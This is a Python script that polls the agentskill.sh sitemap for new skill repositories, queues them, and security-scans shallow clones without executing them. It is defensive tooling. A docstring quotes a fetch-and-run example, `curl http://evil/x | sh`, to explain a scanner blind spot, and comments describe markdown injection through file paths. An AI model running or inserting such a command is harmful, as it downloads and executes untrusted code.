#!/usr/bin/env python3
"""Poll the sources in repo-lists/watch-sources.txt for new catalog candidates.

Charles asked for agentskill.sh to be monitored, with new skills pulled in
regularly after a security check. The file listing it has existed since
2026-09-01 and nothing read it, so it recorded an intention rather than doing
anything. This is the mechanism.

The important half is what it refuses to do.

  It never writes repo-lists/. A poller that can add to the catalog is a poller
  that can be made to add to the catalog by anyone who can publish to the source.
  Candidates land in a separate queue and stay there until Charles moves one into
  a lane file himself, which is also the only thing that makes it installable:
  install_catalog_skill.py refuses any slug that is not already catalogued.

  It never executes anything it fetches. Pages are parsed for one thing, a GitHub
  slug, with a regex. Candidate repositories are cloned with --depth 1 and read;
  no build, no install, no setup script.

  It never treats the source's own score as a verdict. agentskill.sh publishes a
  security score per skill. That is a signal from the party with the least
  incentive to fail a listing, so the scan here is ours, using catalog_security,
  and a candidate with findings is queued as blocked rather than quietly dropped.

Why it polls the way it does, measured against the live site on 2026-09-07 rather
than assumed. The sitemap index declares 268 shards, 255 for skills numbered
contiguously from 0 and 13 for plugins. Roughly half return 404: the index runs
ahead of the content it names. A shard that does exist holds 1000 URLs and about
450 KB, so a full sweep is 410 seconds and 60 MB. Every entry carries the same
lastmod, a site-wide regeneration stamp, so lastmod cannot detect change at all.

That leaves diffing the handle set, which is why there are two bounded loops here
rather than a crawl. The shard cursor persists, so each run reads the next slice
and the report says which shards it skipped; a cap nobody is told about reads as
complete coverage. And a new handle is only worth one page fetch, to answer one
question: which repository does this resolve to.

Usage:
    python scripts/watch_sources.py --poll
    python scripts/watch_sources.py --poll --max-shards 0     # every shard, 410s
    python scripts/watch_sources.py --poll --max-pages 40
    python scripts/watch_sources.py --scan
    python scripts/watch_sources.py --report
    python scripts/watch_sources.py --list
"""
from __future__ import annotations

import argparse
import datetime as dt
import json
import os
import pathlib
import re
import subprocess
import sys
import tempfile
import urllib.error
import urllib.request

ROOT = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))
import catalog_security as security  # noqa: E402
import install_catalog_skill as installer  # noqa: E402

SOURCES = ROOT / "repo-lists" / "watch-sources.txt"
SEEN = ROOT / "docs" / "watch-sources-seen.txt"
QUEUE = ROOT / "docs" / "watch-candidates.json"

SITEMAP = "https://agentskill.sh/sitemap.xml"
USER_AGENT = "Master-Repo-Use catalog watch (+https://github.com/Charlesganu2004/Master-Repo-Use)"
TIMEOUT = 30

# One page resolves to one repository. Anything else on the page is somebody
# else's link and is not a candidate.
HANDLE_RE = re.compile(r"agentskill\.sh/@([\w.-]+)")
LOC_RE = re.compile(r"<loc>(.*?)</loc>")
SHARD_RE = re.compile(r"/(?:skills|plugins)-\d+\.xml$")
SLUG_RE = re.compile(r"github\.com/([\w][\w.-]*/[\w][\w.-]*?)(?:\.git)?(?=[\"'/?#\s<]|$)")

# Slugs that are the site's own furniture rather than a listed skill.
NOT_CANDIDATES = {"agentskill", "agentskill-sh", "sponsors", "topics", "features"}

# Everything a finding string is allowed to be. A finding carries a file path
# from the candidate repository, so its text is chosen by the party being
# scanned, and it is rendered straight into the markdown issue Charles reads to
# decide what to adopt. A path may legally contain a newline, so without this a
# repository that is correctly BLOCKED can print its own "## Passed the scan"
# heading into that issue and list any slug it likes underneath, including a
# typosquat of a catalogued one. Collapse to one line, defuse the markdown
# characters that start a block, and cap the length.
_CONTROL = re.compile(r"[\x00-\x1f\x7f]+")


def safe_finding(text: str, limit: int = 300) -> str:
    """One line, no markdown structure, from text the scanned repository chose."""
    flat = _CONTROL.sub(" ", str(text)).strip()
    flat = re.sub(r"\s{2,}", " ", flat)
    # A leading #, -, *, > or digit-dot starts a heading, bullet or quote.
    flat = re.sub(r"^[#>*\-+=`|\s]+", "", flat)
    flat = flat.replace("`", "'")
    if len(flat) > limit:
        flat = flat[:limit].rstrip() + " [truncated]"
    return flat or "(empty finding)"


def fetch(url: str) -> str:
    request = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
    with urllib.request.urlopen(request, timeout=TIMEOUT) as response:
        return response.read().decode("utf-8", "replace")


def read_sources() -> list[dict]:
    """The source list, kept as the single place a source is declared.

    The file is a human document with inline notes, so the note on the URL line
    is carried through to the report. A source nobody can explain is a source
    nobody should be polling.
    """
    if not SOURCES.exists():
        return []
    out = []
    for line in SOURCES.read_text(encoding="utf-8").splitlines():
        stripped = line.strip()
        if not stripped:
            continue
        if stripped.startswith("#"):
            # An indented comment under a source continues that source's note.
            # The caution on agentskill.sh runs to four such lines, and reporting
            # only the first one drops the word "supply-chain" from the issue
            # body, which is the half worth reading.
            if out and line[:1].isspace():
                out[-1]["note"] = (out[-1]["note"] + " " + stripped.lstrip("# ").strip()).strip()
            continue
        url, _, note = stripped.partition("#")
        out.append({"url": url.strip(), "note": note.strip()})
    return out


def load_seen() -> set[str]:
    if not SEEN.exists():
        return set()
    return {line.strip() for line in SEEN.read_text(encoding="utf-8").splitlines()
            if line.strip() and not line.startswith("#")}


def save_seen(handles: set[str]) -> None:
    header = (
        "# Author handles seen on agentskill.sh, written by scripts/watch_sources.py.\n"
        "# This is a high water mark, not a catalog. A handle here has been observed;\n"
        "# it has not been vetted, adopted, or endorsed. Deleting a line makes the\n"
        "# poller treat that author as new again, which is the only reason to edit it.\n"
    )
    SEEN.write_text(header + "\n".join(sorted(handles)) + "\n", encoding="utf-8")


def load_queue() -> dict:
    if not QUEUE.exists():
        return {"updated": None, "shard_cursor": 0, "baseline_done": False,
                "candidates": {}}
    queue = json.loads(QUEUE.read_text(encoding="utf-8"))
    # A hand-edited or half-written queue must not take the poller down. The
    # missing key is the common case after this file gains a field.
    queue.setdefault("candidates", {})
    queue.setdefault("shard_cursor", 0)
    queue.setdefault("baseline_done", False)
    return queue


def save_queue(queue: dict) -> None:
    queue["updated"] = dt.datetime.now(dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    QUEUE.write_text(json.dumps(queue, indent=2, sort_keys=True) + "\n", encoding="utf-8")


def sitemap_handles(max_shards: int | None = None,
                    cursor: int = 0) -> tuple[set[str], list[str], int, int]:
    """The author handles in a slice of the sitemap, and where to resume.

    Returns (handles, problems, next_cursor, total_shards).

    Measured against the live sitemap on 2026-09-07: the index declares 255
    skills shards numbered contiguously from 0, plus 13 plugin shards. Of the
    first 40, exactly 20 exist and 20 return 404, and a full sweep of all 268 is
    about 410 seconds and 60 MB. The index runs ahead of the content it names,
    which is the site's business, so a 404 on a listed shard is counted and
    summarised in one line while every other failure is reported individually.
    Those are the ones that mean the handle set came back short.

    60 MB a week off someone else's site to answer "is there anything new" is not
    a reasonable default, so the sweep is bounded and the cursor persists. Each
    run reads the next slice and the report says what it skipped, because a cap
    nobody is told about reads as complete coverage.
    """
    handles: set[str] = set()
    problems: list[str] = []
    try:
        listed = LOC_RE.findall(fetch(SITEMAP))
    except (urllib.error.URLError, OSError) as exc:
        return handles, [f"sitemap unreachable: {exc}"], cursor, 0

    # Plugins are capability packs listed the same way and are catalog material
    # for the same reasons skills are. Skipping them was leaving a shelf unread.
    shards = [u for u in listed if SHARD_RE.search(u)]
    if not shards:
        return handles, ["the sitemap listed no skill or plugin shards"], 0, 0

    total = len(shards)
    start = cursor % total
    take = total if max_shards is None else min(max_shards, total)
    window = [shards[(start + n) % total] for n in range(take)]

    absent = 0
    for shard in window:
        try:
            handles |= set(HANDLE_RE.findall(fetch(shard)))
        except urllib.error.HTTPError as exc:
            if exc.code == 404:
                absent += 1
                continue
            problems.append(f"{shard}: HTTP {exc.code}")
        except (urllib.error.URLError, OSError) as exc:
            problems.append(f"{shard}: {exc}")

    if absent:
        problems.append(
            f"{absent} of the {take} shards read returned 404; the sitemap index "
            "runs ahead of the shards it names")
    if take < total:
        problems.append(
            f"read shards {start} to {start + take - 1} of {total}; the rest are "
            "not skipped, the next run resumes there")
    return handles, problems, (start + take) % total, total


def resolve_handle(handle: str) -> dict | None:
    """Turn an author page into a GitHub slug, or nothing.

    A listing that does not resolve to a repository cannot be scanned, cloned or
    catalogued, so it is not a candidate. Recording it as one would put an
    unactionable row in the queue every week.
    """
    url = f"https://agentskill.sh/@{handle}"
    try:
        page = fetch(url)
    except (urllib.error.URLError, OSError):
        return None
    for slug in SLUG_RE.findall(page):
        owner, _, name = slug.partition("/")
        if owner.lower() in NOT_CANDIDATES or not name:
            continue
        if owner.lower() != handle.lower():
            # The page links plenty of repositories. The author's own is the one
            # whose owner matches the handle; anything else is a reference.
            continue
        return {"slug": slug, "source": url}
    return None


def poll(max_pages: int, max_shards: int | None = None, verbose: bool = True) -> dict:
    catalogued = installer.catalogued_slugs()
    seen = load_seen()
    queue = load_queue()
    cursor = queue.get("shard_cursor", 0)
    handles, problems, next_cursor, total = sitemap_handles(max_shards, cursor)

    if not handles:
        return {"listed": 0, "new": 0, "resolved": 0, "queued": 0,
                "already_catalogued": 0, "problems": problems or ["no handles returned"]}

    fresh = sorted(handles - seen)
    result = {"listed": len(handles), "new": len(fresh), "resolved": 0,
              "queued": 0, "already_catalogued": 0, "problems": problems}

    # The baseline is not one run's work when the sweep is bounded. Until the
    # cursor has been all the way round once, every handle read is backlog rather
    # than news, and resolving it would fetch thousands of pages to learn that
    # the site existed before this poller did.
    if not queue.get("baseline_done"):
        save_seen(seen | handles)
        wrapped = next_cursor <= cursor or total == 0 or max_shards is None
        if wrapped:
            queue["baseline_done"] = True
            result["problems"].append(
                f"baseline complete: {len(seen | handles)} handles recorded, none fetched. "
                "From the next run on, a new handle is news.")
        else:
            result["problems"].append(
                f"building the baseline: {len(seen | handles)} handles so far, "
                f"resuming at shard {next_cursor} of {total}. No pages fetched yet.")
        queue["shard_cursor"] = next_cursor
        save_queue(queue)
        return result

    for handle in fresh[:max_pages]:
        found = resolve_handle(handle)
        if not found:
            continue
        result["resolved"] += 1
        slug = found["slug"]
        if slug in catalogued:
            result["already_catalogued"] += 1
            continue
        if slug in queue["candidates"]:
            continue
        queue["candidates"][slug] = {
            "handle": handle,
            "source": found["source"],
            "found": dt.datetime.now(dt.timezone.utc).strftime("%Y-%m-%d"),
            "security": "unscanned",
            "findings": [],
        }
        result["queued"] += 1
        if verbose:
            print(f"  candidate {slug}  from @{handle}")

    # Only the handles actually looked at are marked seen. The rest stay new so
    # the next run continues through the backlog instead of losing it.
    save_seen(seen | set(fresh[:max_pages]))
    queue["shard_cursor"] = next_cursor
    save_queue(queue)
    return result



# Git says these when the repository is fine and the filesystem is not. Windows
# rejects a path with a trailing space or a reserved name, so the clone succeeds
# and the checkout does not. Calling that UNREACHABLE would be a lie about the
# repository, and calling it CLEAN would be a lie about the scan, so it is
# INCONCLUSIVE: the Linux runner will reach a real verdict.
_CHECKOUT_LIMITS = ("unable to checkout working tree", "invalid path",
                    "filename too long")


def scan_tree_honestly(clone: pathlib.Path) -> list[str]:
    """Every scanner that is available, and a loud note for every one that is not.

    installer.scan_tree on its own is regexes over files that decode as UTF-8,
    and it drops anything that does not decode without saying so. That made a
    UTF-16 install.ps1 carrying `curl http://evil/x | sh` scan CLEAN, which is
    the worst possible answer: the candidate then appears in the issue under
    "passed the scan" with nothing having looked at the payload at all.

    So the undecodable files are counted and reported, and the real scanners run
    here the way catalog_guardian runs them. Each returns SCANNER-ERROR when it
    is missing, which maps to INCONCLUSIVE below rather than to CLEAN.
    """
    findings = list(installer.scan_tree(clone))

    unread = 0
    for path in clone.rglob("*"):
        if not path.is_file() or any(part in installer.SKIP_DIRS for part in path.parts):
            continue
        try:
            path.read_text(encoding="utf-8")
        except UnicodeDecodeError:
            unread += 1
        except OSError:
            unread += 1
    if unread:
        findings.append(
            f"SCANNER-ERROR {unread} file(s) are not UTF-8 text, so the heuristic "
            "scan could not read them; a payload in one would be invisible here")

    findings += security.run_gitleaks(clone)
    findings += security.run_external(
        ["osv-scanner", "scan", "source", "-r", "."], clone, "osv-scanner")
    findings += security.run_external(
        ["semgrep", "--config", "p/command-injection", "--error", "."],
        clone, "semgrep-command-injection")
    if security.clamav_database_ready():
        findings += security.run_external(
            ["clamscan", "-r", "--infected", "--no-summary", "."], clone, "clamav")
    else:
        findings.append("SCANNER-ERROR clamav has no signature database; "
                        "malware scanning did not run")
    return findings


def scan_candidate(slug: str) -> tuple[str, list[str]]:
    """Clone read-only and scan it. CLEAN means every scanner ran and found nothing."""
    with tempfile.TemporaryDirectory() as tmp:
        target = pathlib.Path(tmp) / "clone"
        try:
            # Inheriting the environment matters: a PATH-only env loses SystemRoot
            # on Windows and git fails DNS with "getaddrinfo() thread failed".
            subprocess.run(
                ["git", "clone", "--depth", "1", "--quiet",
                 f"https://github.com/{slug}.git", str(target)],
                check=True, capture_output=True, timeout=180, env=os.environ.copy())
        except subprocess.CalledProcessError as exc:
            stderr = exc.stderr.decode("utf-8", "replace").strip()
            lowered = stderr.lower()
            if any(limit in lowered for limit in _CHECKOUT_LIMITS):
                return "inconclusive", [
                    "the repository exists but could not be checked out on this "
                    "platform, so nothing was scanned: " + stderr[:300]]
            return "unreachable", [stderr[:400]]
        except subprocess.TimeoutExpired:
            return "unreachable", ["clone timed out after 180s"]
        findings = scan_tree_honestly(target)

    findings = [safe_finding(f) for f in findings]
    if not findings:
        return "clean", []
    # Order matters. A scanner that did not run outranks a scanner that found
    # nothing, so a run with one missing scanner is never reported as clean.
    if security.has_scanner_error(findings):
        return "inconclusive", findings
    return "blocked", findings


def scan(limit: int, verbose: bool = True) -> dict:
    queue = load_queue()
    pending = [slug for slug, row in queue["candidates"].items()
               if row["security"] == "unscanned"]
    counts = {"scanned": 0, "clean": 0, "blocked": 0,
              "inconclusive": 0, "unreachable": 0, "pending": len(pending)}
    for slug in pending[:limit]:
        verdict, findings = scan_candidate(slug)
        queue["candidates"][slug]["security"] = verdict
        queue["candidates"][slug]["findings"] = findings[:20]
        queue["candidates"][slug]["scanned"] = dt.datetime.now(
            dt.timezone.utc).strftime("%Y-%m-%d")
        counts["scanned"] += 1
        counts[verdict] += 1
        if verbose:
            print(f"  {verdict:12} {slug}" + (f"  ({len(findings)} findings)" if findings else ""))
    counts["pending"] = max(0, counts["pending"] - counts["scanned"])
    save_queue(queue)
    return counts


def report() -> str:
    """The body of the issue the workflow opens. Blocked first, always."""
    queue = load_queue()
    rows = queue["candidates"]
    by = {}
    for slug, row in rows.items():
        by.setdefault(row["security"], []).append((slug, row))

    lines = ["## Watched sources", ""]
    for source in read_sources():
        lines.append(f"- {source['url']}" + (f"  {source['note']}" if source["note"] else ""))
    lines += ["", f"Queue last written: {queue.get('updated') or 'never'}", ""]

    if by.get("blocked"):
        lines += ["## Blocked by the scan", "",
                  "These are not adoption candidates. They are listed so the finding is",
                  "on the record rather than discovered again next week.", ""]
        for slug, row in sorted(by["blocked"]):
            lines.append(f"- **{slug}** from {row['source']}")
            # Sanitised again at render, not only at scan. The queue file is
            # committed and read back, so a row written before safe_finding
            # existed, or edited by hand, must not reach the issue raw.
            for finding in row["findings"][:3]:
                lines.append(f"  - {safe_finding(finding)}")
        lines.append("")

    if by.get("clean"):
        lines += ["## Passed the scan, awaiting your decision", "",
                  "A clean scan is not an endorsement. Nothing here can be installed until",
                  "you add the slug to a lane file in repo-lists/ yourself, which is what",
                  "install_catalog_skill.py checks before it will touch anything.", ""]
        for slug, row in sorted(by["clean"]):
            lines.append(f"- **{slug}** from {row['source']}, found {row['found']}")
        lines.append("")

    for state, title in (("unscanned", "Queued, not yet scanned"),
                         ("inconclusive", "Scanner could not reach a verdict"),
                         ("unreachable", "Repository could not be cloned")):
        if by.get(state):
            lines += [f"## {title}", ""]
            lines += [f"- {slug}" for slug, _ in sorted(by[state])] + [""]

    if not rows:
        lines += ["No candidates in the queue.", ""]
    return "\n".join(lines)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    parser.add_argument("--poll", action="store_true", help="check the sources for new listings")
    parser.add_argument("--scan", action="store_true", help="security scan the queued candidates")
    parser.add_argument("--report", action="store_true", help="print the issue body")
    parser.add_argument("--list", action="store_true", help="print the queue as JSON")
    parser.add_argument("--max-pages", type=int, default=25,
                        help="author pages to fetch in one poll (default 25)")
    parser.add_argument("--scan-limit", type=int, default=10,
                        help="candidates to scan in one run (default 10)")
    parser.add_argument("--max-shards", type=int, default=40,
                        help="sitemap shards to read in one poll, resuming where the "
                             "last run stopped (default 40; 0 reads every shard, which "
                             "measured 410s and 60MB on 2026-09-07)")
    args = parser.parse_args()

    if not any((args.poll, args.scan, args.report, args.list)):
        parser.print_help()
        return 2

    if args.poll:
        print("Polling watched sources")
        result = poll(args.max_pages, args.max_shards or None)
        print(f"  listed {result['listed']}, new {result['new']}, "
              f"resolved {result['resolved']}, queued {result['queued']}, "
              f"already catalogued {result['already_catalogued']}")
        for problem in result["problems"]:
            print(f"  note: {problem}")

    if args.scan:
        print("Scanning queued candidates")
        counts = scan(args.scan_limit)
        print(f"  scanned {counts['scanned']}: {counts['clean']} clean, "
              f"{counts['blocked']} blocked, {counts['inconclusive']} inconclusive, "
              f"{counts['unreachable']} unreachable. {counts['pending']} still pending.")

    if args.report:
        print(report())

    if args.list:
        print(json.dumps(load_queue(), indent=2, sort_keys=True))

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
